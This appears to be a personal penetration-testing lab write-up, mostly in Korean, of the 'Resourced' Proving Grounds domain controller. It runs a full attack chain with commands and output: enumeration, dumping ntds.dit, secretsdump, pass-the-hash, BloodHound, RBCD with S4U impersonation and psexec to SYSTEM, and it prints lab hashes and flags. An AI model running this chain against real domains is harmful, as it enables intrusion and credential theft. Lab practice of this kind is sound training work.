---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/ad/dcsync
  - tech/ad/rbcd
  - tech/ad/acl-abuse
  - tech/ad/pth
  - tech/ad/bloodhound
  - tech/svc/smb
  - tech/exec/winrm
  - tech/exec/psexec
type: machine
platform: pg
os: windows
ip: 192.168.125.175
domain: resourced.local
ports: [53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, ms-wbt-server, msrpc, ncacn_http, netbios-ssn]
status: solved
tech_count: 8
---
## Nmap
```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ nnmap 192.168.125.175
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-03 09:13 +0900
Nmap scan report for 192.168.125.175
Host is up (0.068s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-03 00:14:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-03T00:15:02+00:00
|_ssl-date: 2026-07-03T00:15:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2026-07-02T00:11:20
|_Not valid after:  2027-01-01T00:11:20
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-03T00:15:04
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   65.68 ms 192.168.45.1
2   65.64 ms 192.168.45.254
3   66.42 ms 192.168.251.1
4   66.77 ms 192.168.125.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.58 seconds
```

smb로 유저목록 파악 패스워드로 추정되는 텍스트 발견 

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ nxc smb 192.168.125.175 --users
SMB         192.168.125.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.125.175 445    RESOURCEDC       -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         192.168.125.175 445    RESOURCEDC       Administrator                 2022-02-11 17:21:20 0       Built-in account for administering the computer/domain
SMB         192.168.125.175 445    RESOURCEDC       Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         192.168.125.175 445    RESOURCEDC       krbtgt                        2021-10-01 11:08:53 0       Key Distribution Center Service Account
SMB         192.168.125.175 445    RESOURCEDC       M.Mason                       2021-10-01 11:14:51 0       Ex IT admin
SMB         192.168.125.175 445    RESOURCEDC       K.Keen                        2021-10-01 11:14:51 0       Frontend Developer
SMB         192.168.125.175 445    RESOURCEDC       L.Livingstone                 2021-10-01 11:14:51 0       SysAdmin
SMB         192.168.125.175 445    RESOURCEDC       J.Johnson                     2021-10-01 11:14:52 0       Networking specialist
SMB         192.168.125.175 445    RESOURCEDC       V.Ventz                       2021-10-01 11:14:52 0       New-hired, reminder: HotelCalifornia194!
SMB         192.168.125.175 445    RESOURCEDC       S.Swanson                     2021-10-01 11:14:52 0       Military Vet now cybersecurity specialist
SMB         192.168.125.175 445    RESOURCEDC       P.Parker                      2021-10-01 11:14:52 0       Backend Developer
SMB         192.168.125.175 445    RESOURCEDC       R.Robinson                    2021-10-01 11:14:52 0       Database Admin
SMB         192.168.125.175 445    RESOURCEDC       D.Durant                      2021-10-01 11:14:52 0       Linear Algebra and crypto god
SMB         192.168.125.175 445    RESOURCEDC       G.Goldberg                    2021-10-01 11:14:52 0       Blockchain expert
SMB         192.168.125.175 445    RESOURCEDC       [*] Enumerated 13 local users: resourced
```
![[Pasted image 20260703101938.png]]

접근 가능한 서비스 확인
```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ nxc-sweep 192.168.125.175 -u 'V.Ventz' -p 'HotelCalifornia194!'
[*] Starting NXC sweep for 192.168.125.175 as V.Ventz ...

[+] Port 445 open. Checking smb ...
SMB         192.168.125.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.125.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194!
SMB         192.168.125.175 445    RESOURCEDC       [*] Enumerated shares
SMB         192.168.125.175 445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.125.175 445    RESOURCEDC       -----           -----------     ------
SMB         192.168.125.175 445    RESOURCEDC       ADMIN$                          Remote Admin
SMB         192.168.125.175 445    RESOURCEDC       C$                              Default share
SMB         192.168.125.175 445    RESOURCEDC       IPC$            READ            Remote IPC
SMB         192.168.125.175 445    RESOURCEDC       NETLOGON        READ            Logon server share
SMB         192.168.125.175 445    RESOURCEDC       Password Audit  READ
SMB         192.168.125.175 445    RESOURCEDC       SYSVOL          READ            Logon server share

[+] Port 5985 open. Checking winrm ...
WINRM       192.168.125.175 5985   RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
WINRM       192.168.125.175 5985   RESOURCEDC       [-] resourced.local\V.Ventz:HotelCalifornia194!

[+] Port 3389 open. Checking rdp ...
RDP         192.168.125.175 3389   RESOURCEDC       [*] Windows 10 or Windows Server 2016 Build 17763 (name:RESOURCEDC) (domain:resourced.local) (nla:False)
RDP         192.168.125.175 3389   RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194!

[-] Port 1433 closed/filtered. Skipping mssql

[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.
```
![[Pasted image 20260703104211.png]]

Password Audit 폴더 전체 덤프
```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ smbclient '//192.168.125.175/Password Audit' -U V.Ventz
Password for [WORKGROUP\V.Ventz]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct  5 17:49:16 2021
  ..                                  D        0  Tue Oct  5 17:49:16 2021
  Active Directory                    D        0  Tue Oct  5 17:49:16 2021
  registry                            D        0  Tue Oct  5 17:49:16 2021

                7706623 blocks of size 4096. 2687456 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Active Directory\ntds.dit of size 25165824 as Active Directory/ntds.dit (2463.5 KiloBytes/sec) (average 2463.5 KiloBytes/sec)
getting file \Active Directory\ntds.jfm of size 16384 as Active Directory/ntds.jfm (59.9 KiloBytes/sec) (average 2400.9 KiloBytes/sec)
getting file \registry\SECURITY of size 65536 as registry/SECURITY (237.0 KiloBytes/sec) (average 2345.3 KiloBytes/sec)
getting file \registry\SYSTEM of size 16777216 as registry/SYSTEM (1750.2 KiloBytes/sec) (average 2065.0 KiloBytes/sec)
```


![[Pasted image 20260703133853.png]]

SECURITY 파일 및 .dit, .jfm 파일 확보
```bash
┌──(kali㉿kali)-[~/PG/Resourced/registry]
└─$ ls -al ../Active\ Directory
total 24600
drwxrwxr-x 2 kali kali     4096 Jul  3 13:21 .
drwxrwxr-x 4 kali kali     4096 Jul  3 13:21 ..
-rw-r--r-- 1 kali kali 25165824 Jul  3 13:21 ntds.dit
-rw-r--r-- 1 kali kali    16384 Jul  3 13:21 ntds.jfm
```

![[Pasted image 20260703134408.png]]


impacket-secretdump 사용하여 내용 추출
```bash
┌──(kali㉿kali)-[~/PG/Resourced/registry]
└─$ impacket-secretsdump -system SYSTEM -security SECURITY local -ntds ntds.dit
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
[*] DPAPI_SYSTEM
dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
[*] NL$KM
 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.>.J......I.
 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
[*] Cleaning up...
```

![[Pasted image 20260703134859.png]]

```bash
# hashes 원본에서 추출
cut -d: -f1 hashes.txt > users.txt      # 사용자명
cut -d: -f4 hashes.txt > nt.txt         # NT 해시 (4번째 필드)
```

유효한 자격증명 획득 `L.Livingstone/19a3a7550ce8c505c2d46b5e39d6f808`
```bash 
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ nxc smb 192.168.125.175 -u users.txt -H hashs.txt --no-bruteforce --continue-on-success
SMB         192.168.125.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\RESOURCEDC:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\krbtgt:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\M.Mason:3105e0f6af52aba8e11d19f27e487e45 STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\K.Keen:204410cc5a7147cd52a04ddae6754b0c STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\J.Johnson:3e028552b946cc4f282b72879f63b726 STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:913c144caea1c0a936fd1ccb46929d3c
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\S.Swanson:bd7c11a9021d2708eda561984f3c8939 STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\P.Parker:980910b8fc2e4fe9d482123301dd19fe STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\R.Robinson:fea5a148c14cf51590456b2102b29fac STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\D.Durant:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\G.Goldberg:62e16d17c3015c47b4d513e65ca757a2 STATUS_PASSWORD_EXPIRED
```

![[Pasted image 20260703141736.png]]


![[Pasted image 20260703142509.png]]

evil-winrm 접속 후 flag 확인
```bash
┌──(kali㉿kali)-[~/PG/Resourced/registry]
└─$ evil-winrm -i 192.168.125.175 -u 'L.Livingstone' -H 19a3a7550ce8c505c2d46b5e39d6f808

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> type ../desktop/local.txt
7a1b4d1533fb4d6bea00b6af60a08d15
```

![[Pasted image 20260703142645.png]]

bloodhound-python 실행
```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ bloodhound-python -d resourced.local -u v.ventz -p 'HotelCalifornia194!' -ns 192.168.125.175 -c all --dns-timeout 30
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: resourced.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (resourcedc.resourced.local:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: resourcedc.resourced.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: resourcedc.resourced.local
INFO: Found 14 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: ResourceDC.resourced.local
INFO: Done in 00M 13S
```

bloodhound를 사용하여 GenericAll 권한 가진 것을 확인
![[Pasted image 20260706091608.png]]


DC 내 계정 생성
```bash
┌──(kali㉿kali)-[~]
└─$ impacket-addcomputer -computer-name '4Leaf$' -computer-pass 'a123a123!@' \
  -dc-ip 192.168.120.175 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account 4Leaf$ with password a123a123!@.
```

![[Pasted image 20260706104812.png]]

GenericAll 권한으로 RBCD 설정

```bash
impacket-rbcd -delegate-from '4Leaf$' -delegate-to 'RESOURCEDC$' -action write \
  -dc-ip 192.168.120.175 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808
```

![[Pasted image 20260706104945.png]]

Administrator 사칭 티켓 발급  (S4U)
```bash
impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate Administrator \
  -dc-ip 192.168.120.175 'resourced.local/4Leaf$:a123a123!@'
```

![[Pasted image 20260706105049.png]]

발급된 티켓으로 system 로그인

```bash
┌──(kali㉿kali)-[~]
└─$ sudo sed -i '/resourced.local/d' /etc/hosts

┌──(kali㉿kali)-[~]
└─$ echo "192.168.120.175  resourcedc.resourced.local resourced.local" | sudo tee -a /etc/hosts
192.168.120.175  resourcedc.resourced.local resourced.local

┌──(kali㉿kali)-[~]
└─$ impacket-psexec -k -no-pass resourcedc.resourced.local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file kEggVEPn.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service udmb on resourcedc.resourced.local.....
[*] Starting service udmb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system


:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of C:\Users\Administrator\Desktop

10/01/2021  04:28 AM    <DIR>          .
10/01/2021  04:28 AM    <DIR>          ..
07/05/2026  06:46 PM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)  11,007,508,480 bytes free

C:\Users\Administrator\Desktop> type proof.txt
5c7891bdc3a7fc5628221ef49b43b839
```

